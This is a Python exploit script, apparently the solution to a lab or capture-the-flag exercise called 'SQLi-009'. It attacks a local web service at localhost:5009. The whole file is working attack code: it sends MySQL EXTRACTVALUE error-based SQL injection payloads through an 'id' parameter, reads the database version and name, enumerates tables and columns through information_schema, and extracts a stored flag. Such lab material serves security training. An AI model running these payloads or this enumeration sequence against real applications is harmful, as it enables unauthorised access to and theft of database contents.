#!/usr/bin/env python3
"""SQLi-009 Exploit - EXTRACTVALUE Error-based SQLi"""
import requests
import re
import sys

TARGET = "http://localhost:5009/product"

def extract(query, debug=False):
    """Extract data using EXTRACTVALUE error-based technique"""
    payload = f"1' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}),0x7e))-- -"
    
    if debug:
        print(f"\n[DEBUG] Payload: {payload}")
        print(f"[DEBUG] Full URL: {TARGET}?id={payload}")
    
    try:
        # Disable caching
        r = requests.get(
            TARGET, 
            params={"id": payload},
            headers={
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0'
            }
        )
        
        if debug:
            print(f"[DEBUG] Status Code: {r.status_code}")
            print(f"[DEBUG] Response excerpt: {r.text[:500]}")
        
        # Extract data from XPATH error
        match = re.search(r"XPATH syntax error: ['\"]?~([^~]+)~", r.text)
        if match:
            return match.group(1)
        
        # Fallback pattern
        match = re.search(r"~([^~]+)~", r.text)
        return match.group(1) if match else None
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def main():
    print("="*60)
    print("SQLi-009: EXTRACTVALUE Error-based Exploitation")
    print("="*60)
    
    # Test 1: Extract MySQL version
    print("\n[*] Step 1: Extracting MySQL version...")
    version = extract('SELECT version()', debug=True)
    print(f"[+] MySQL Version: {version}")
    
    # Test 2: Extract database name
    print("\n[*] Step 2: Extracting database name...")
    database = extract('SELECT database()', debug=True)
    print(f"[+] Database Name: {database}")
    
    # Verify they are different
    if version == database:
        print("\n[!] WARNING: Version and Database returned same value!")
        print("[!] This suggests caching or connectivity issue.")
        print("[!] Try:")
        print("    1. Stop and restart the Docker container")
        print("    2. Clear ALL browser cache and cookies")
        print("    3. Use a different browser or incognito mode")
        return
    
    # Test 3: Enumerate tables
    print("\n[*] Step 3: Enumerating tables...")
    table1 = extract('SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1')
    table2 = extract('SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1')
    print(f"[+] Tables found: {table1}, {table2}")
    
    # Test 4: Extract column name from flags table
    print("\n[*] Step 4: Extracting column from flags table...")
    column = extract("SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 0,1")
    print(f"[+] Column: {column}")
    
    # Test 5: Extract flag
    print("\n[*] Step 5: Extracting flag...")
    flag = extract('SELECT flag_value FROM flags LIMIT 0,1')
    print(f"\n{'='*60}")
    print(f"ðŸš© FLAG: {flag}")
    print(f"{'='*60}")

if __name__ == '__main__':
    main()
